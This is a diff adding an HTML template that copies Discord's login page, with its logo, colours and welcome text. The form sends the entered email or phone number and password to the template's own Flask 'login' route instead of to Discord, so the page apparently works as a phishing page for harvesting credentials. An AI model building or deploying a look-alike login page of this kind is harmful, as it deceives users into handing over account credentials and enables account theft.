@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #5865f2;
+            color: #dcddde;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated gradient background */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #6B8DD6 50%, #8E37D7 75%, #667eea 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            z-index: 1;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 2;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: float 20s infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) translateX(0) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.4;
+            }
+            90% {
+                opacity: 0.4;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) scale(1);
+                opacity: 0;
+            }
+        }
+
+        /* Create multiple particles */
+        .particle:nth-child(1) { width: 80px; height: 80px; left: 10%; animation-duration: 25s; animation-delay: 0s; }
+        .particle:nth-child(2) { width: 60px; height: 60px; left: 20%; animation-duration: 20s; animation-delay: 2s; }
+        .particle:nth-child(3) { width: 100px; height: 100px; left: 35%; animation-duration: 30s; animation-delay: 4s; }
+        .particle:nth-child(4) { width: 40px; height: 40px; left: 50%; animation-duration: 18s; animation-delay: 0s; }
+        .particle:nth-child(5) { width: 90px; height: 90px; left: 70%; animation-duration: 22s; animation-delay: 3s; }
+        .particle:nth-child(6) { width: 50px; height: 50px; left: 85%; animation-duration: 28s; animation-delay: 1s; }
+        .particle:nth-child(7) { width: 120px; height: 120px; left: 5%; animation-duration: 35s; animation-delay: 5s; opacity: 0.2; }
+        .particle:nth-child(8) { width: 30px; height: 30px; left: 90%; animation-duration: 15s; animation-delay: 2s; }
+
+        /* Content container */
+        .app-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3;
+        }
+
+        /* Discord Logo */
+        .logo-container {
+            position: absolute;
+            top: 24px;
+            left: 24px;
+            z-index: 4;
+        }
+
+        .discord-logo {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .discord-logo svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
+        }
+
+        /* Auth card */
+        .auth-card {
+            background: #313338;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            padding: 32px;
+            width: 420px;
+            max-width: 90%;
+            animation: fadeInUp 0.3s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Login section */
+        .login-section {
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #f2f3f5;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #b5bac1;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #b5bac1;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+        }
+
+        .required {
+            color: #f23f42;
+            margin-left: 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #1e1f22;
+            border: 1px solid #1e1f22;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.15s ease-in-out;
+        }
+
+        input:hover {
+            border-color: #040405;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+
+        .forgot-password {
+            display: inline-block;
+            margin-top: 4px;
+            margin-bottom: 20px;
+            color: #00a8fc;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.15s;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 11px;
+            background: #5865f2;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.15s ease-in-out;
+            margin-bottom: 12px;
+        }
+
+        .login-button:hover {
+            background: #4752c4;
+        }
+
+        .login-button:active {
+            background: #3c45a5;
+        }
+
+        .register-section {
+            font-size: 14px;
+            color: #949ba4;
+        }
+
+        .register-link {
+            color: #00a8fc;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+
+        .register-link:hover {
+            text-decoration: underline;
+        }
+
+        /* QR Code Section */
+        .qr-section {
+            flex: 0 0 240px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .qr-code-container {
+            width: 176px;
+            height: 176px;
+            background: white;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .qr-code {
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/png;base64,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');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .discord-icon-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 48px;
+            height: 48px;
+            background: #5865f2;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .discord-icon-overlay svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+
+        .qr-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #f2f3f5;
+            margin-bottom: 8px;
+        }
+
+        .qr-description {
+            font-size: 14px;
+            color: #b5bac1;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+
+        .qr-description strong {
+            color: #f2f3f5;
+            font-weight: 500;
+        }
+
+        .passkey-link {
+            color: #00a8fc;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.15s;
+        }
+
+        .passkey-link:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .auth-card {
+                flex-direction: column;
+                width: 480px;
+                gap: 32px;
+                padding: 32px 16px;
+            }
+
+            .qr-section {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    
+    <!-- Floating particles -->
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+
+    <div class="app-container">
+        <!-- Discord Logo -->
+        <div class="logo-container">
+            <div class="discord-logo">
+                <svg viewBox="0 0 28 20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M23.7 5.1c-1.8-0.8-3.7-1.4-5.7-1.8-0.2 0-0.4 0.1-0.5 0.3-0.2 0.4-0.5 1-0.7 1.4-2.1-0.3-4.2-0.3-6.3 0-0.2-0.5-0.5-1-0.7-1.4-0.1-0.2-0.3-0.3-0.5-0.3-2 0.3-3.9 1-5.7 1.8-0.1 0-0.2 0.1-0.2 0.1C0.4 10.1-0.2 15 0.1 19.8c0 0.1 0 0.2 0.1 0.3 2.4 1.8 4.7 2.8 7 3.5 0.2 0 0.4 0 0.5-0.2 0.5-0.7 1-1.5 1.4-2.3 0.1-0.2 0-0.4-0.2-0.5-0.7-0.3-1.4-0.6-2.1-1-0.2-0.1-0.2-0.4 0-0.5 0.1-0.1 0.3-0.2 0.4-0.3 0.1-0.1 0.2-0.1 0.3 0 4.6 2.1 9.5 2.1 14.1 0 0.1-0.1 0.2-0.1 0.3 0 0.1 0.1 0.3 0.2 0.4 0.3 0.2 0.1 0.2 0.4 0 0.5-0.7 0.3-1.4 0.7-2.1 1-0.2 0.1-0.3 0.3-0.2 0.5 0.4 0.8 0.9 1.6 1.4 2.3 0.1 0.2 0.3 0.2 0.5 0.2 2.3-0.7 4.6-1.8 7-3.5 0.1 0 0.1-0.1 0.1-0.2 0.4-4.3-0.6-8-2.6-11.1 0-0.1-0.1-0.2-0.2-0.2zM9.3 16.7c-1.4 0-2.5-1.3-2.5-2.8s1.1-2.8 2.5-2.8c1.4 0 2.6 1.3 2.5 2.8 0 1.5-1.1 2.8-2.5 2.8zm9.2 0c-1.4 0-2.5-1.3-2.5-2.8s1.1-2.8 2.5-2.8c1.4 0 2.6 1.3 2.5 2.8 0 1.5-1.1 2.8-2.5 2.8z"/>
+                </svg>
+                Discord
+            </div>
+        </div>
+
+        <!-- Auth Card -->
+        <div class="auth-card">
+            <div class="login-section">
+                <h1>Welcome back!</h1>
+                <p class="subtitle">We're so excited to see you again!</p>
+                
+                <form method="POST" action ="{{ url_for('login') }}">
+                    <div class="form-group">
+                        <label for="email">EMAIL OR PHONE NUMBER <span class="required">*</span></label>
+                        <input type="text" id="email" name="email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">PASSWORD <span class="required">*</span></label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Forgot your password?</a>
+                    
+                    <button type="submit" class="login-button">Log In</button>
+                    
+                    <div class="register-section">
+                        <span>Need an account?</span>
+                        <a href="#" class="register-link">Register</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
